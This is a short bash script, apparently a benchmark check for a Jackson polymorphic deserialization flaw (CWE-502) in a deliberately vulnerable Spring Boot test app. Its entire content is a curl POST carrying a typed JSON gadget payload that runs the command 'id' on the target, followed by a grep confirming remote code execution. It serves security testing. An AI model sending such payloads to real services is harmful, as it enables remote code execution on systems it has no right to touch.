#!/usr/bin/env bash
# JACKSON-DESER-001 (CWE-502): Jackson polymorphic deserialization. Default typing
# lets the JSON name the concrete class (["<class>",{...}]); the shipped GadgetProbe
# is instantiated and its setter runs a command -> RCE (proven by running id).
set -eu; . "$(dirname "$0")/_lib.sh"
curl -s -X POST "$TARGET/api/import/typed" -H 'content-type: application/json' \
  -d '["com.bench.springboot.GadgetProbe",{"command":"id"}]' | grep -q 'uid=[0-9]'
